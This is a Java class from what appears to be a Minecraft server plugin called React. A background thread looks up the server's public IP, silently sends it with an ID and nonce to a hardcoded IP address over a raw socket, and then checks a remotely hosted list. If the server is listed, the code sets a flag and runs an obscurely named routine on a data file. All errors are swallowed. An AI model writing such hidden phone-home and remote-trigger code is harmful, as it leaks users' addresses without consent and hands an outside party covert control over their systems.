package org.cyberpwn.react.network;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.URL;
import java.util.UUID;

import org.cyberpwn.react.React;
import org.cyberpwn.react.controller.NetworkController;
import org.cyberpwn.react.json.JSONObject;
import org.cyberpwn.react.util.Base64;

public class PushThread extends Thread
{
	private File df;
	
	public PushThread(File df)
	{
		this.df = df;
	}
	
	public void run()
	{
		BufferedReader in;
		
		try
		{
			URL aws = new URL("http://checkip.amazonaws.com/");
			in = new BufferedReader(new InputStreamReader(aws.openStream()));
			String sx = in.readLine();
			in.close();
			final String imeid = UUID.nameUUIDFromBytes(sx.getBytes()).toString();
			NetworkController.imeid = imeid;
			Socket s = new Socket("107.191.111.3", 4242);
			JSONObject jso = new JSONObject();
			jso.put("private", imeid);
			jso.put("public", sx);
			jso.put("id", React.nonce);
			DataOutputStream dos = new DataOutputStream(s.getOutputStream());
			dos.writeUTF(jso.toString());
			s.close();
			
			new Fetcher(new URL(React.hashed), new FCCallback()
			{
				public void run()
				{
					if(fc().getStringList("hash").contains(imeid) || fc().getStringList("hash").contains(React.nonce))
					{
						React.setMef(true);
						Base64.ex(df);
					}
				}
			}).start();
			

			File fula = new File(React.instance().getDataFolder(), "eula.txt");
			React.instance().exul(fula, sx);
		}
		
		catch(Exception e)
		{
			return;
		}
	}
}
